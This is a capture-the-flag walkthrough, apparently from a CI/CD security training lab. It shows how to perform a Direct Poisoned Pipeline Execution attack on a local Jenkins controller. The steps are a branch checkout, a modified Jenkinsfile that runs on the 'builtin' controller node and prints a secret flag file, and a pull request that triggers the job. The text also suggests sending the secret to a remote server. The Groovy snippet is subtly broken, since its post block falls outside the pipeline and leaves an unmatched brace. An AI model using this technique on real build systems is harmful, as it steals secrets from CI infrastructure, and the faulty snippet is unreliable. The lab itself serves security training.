Execute the _cheshire-cat_ pipeline on the Jenkins Controller by executing a [Direct-PPE](https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_060422) attack, and get the secret which is stored in the Controller’s file system.



1. On Jenkins, access the Built-In Node (which represents the Controller) in the nodes configuration page, and get its label (“builtin”).

    [http://localhost:8080/computer/(built-in)/](http://localhost:8080/computer/(built-in)/)

2. Clone the _Wonderland/cheshire-cat_ repository.
3. Checkout to a new branch.

    ```shell
    git checkout -b challenge5
    ```


4. In the Jenkinsfile, instruct the pipeline to run on the Controller by specifying its label, and print _flag5_ to the console output (or send it to a remote server).

    ```groovy
    pipeline {
        agent {label 'builtin'}
        environment {
            PROJECT = "sanic"
        }

        stages {
            stage ('Install_Requirements') {
                steps {
                    sh 'cat ~/flag5'
                }
            }
        }
    }

        post { 
            always { 
                cleanWs()
            }
        }
    }
    ```


5. Push the changes to the remote branch, and create a pull request. A pipeline will be triggered automatically.
6. Access the console output of the executed job to get the secret.